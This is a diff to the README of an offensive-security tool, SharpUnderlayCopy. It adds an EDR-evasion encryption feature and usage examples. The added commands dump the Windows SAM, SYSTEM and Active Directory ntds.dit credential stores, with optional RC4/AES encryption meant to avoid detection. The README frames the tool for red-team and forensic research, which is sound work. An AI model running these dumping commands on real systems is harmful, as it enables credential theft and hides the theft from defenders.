@@ -5,6 +5,18 @@
 This version is intended to support **.NET loaders (e.g. NetLoader / in-memory execution)** and focuses on **raw NTFS metadata–driven acquisition** for research, red-team, and DFIR use cases.
 
 ---
+## 🆕 New: Optional Evasion via RC4/AES Encryption
+
+**SharpUnderlayCopy now includes optional encryption for on-disk and in-memory file reconstruction buffers using RC4 and AES algorithms.**  
+This feature is designed to help **evade EDR (Endpoint Detection and Response) solutions** that may inspect or correlate cleartext artifacts during file acquisition. 
+
+- **Encryption options**: RC4 or AES, selectable via function parameters or CLI switch.
+- **When enabled**, file contents are encrypted during acquisition and written in an encrypted form.
+- **Decryption utility** or code sample provided (see [Decrypting Acquisitions](#decrypting-acquisitions)).
+- Intended for offensive research and situations requiring additional OPSEC/anti-EDR considerations.
+
+> ⚠️ **Note:** Usage of encryption does not guarantee evasion. Use responsibly within legal and ethical boundaries.
+
 
 ## Supported Modes
 
@@ -46,6 +58,31 @@ This approach enables access to **files even when filesystem allocation queries 
  ### Example
 ```
 SharpUnderlayCopy Metadata C:\Windows\System32\config\SAM C:\Windows\Temp\sam.dmp
+SharpUnderlayCopy MFT C:\Windows\System32\config\system C:\Windows\Temp\system.dmp
+SharpUnderlayCopy Metadata C:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dmp
 ```
+## Encryption Usage Example
+
+To acquire and encrypt a file using RC4 or AES256:
+
+```
+SharpUnderlayCopy.exe MFT C:\Windows\System32\config\sam sam RC4 key
+SharpUnderlayCopy.exe Metadata C:\Windows\System32\config\System system AES256 key
+SharpUnderlayCopy.exe Metadata C:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dmp AES256 key
+```
+
+- The **key** parameter is *optional*. If omitted, a default key is used.
+- Supported encryption algorithms: **RC4** and **AES256**.
+- Output file will be encrypted with the selected algorithm.
+
+**Example (with default key):**
+```
+SharpUnderlayCopy.exe MFT C:\Windows\System32\config\System system RC4
+```
+
 ### Reference 
 https://github.com/kfallahi/UnderlayCopy/blob/main/README.md
+
+## Acknowledgments
+
+Special thanks to [bott0n](https://github.com/bott0n) for highlighting the importance of encryption during real-world use and for your valuable feedback and suggestions!
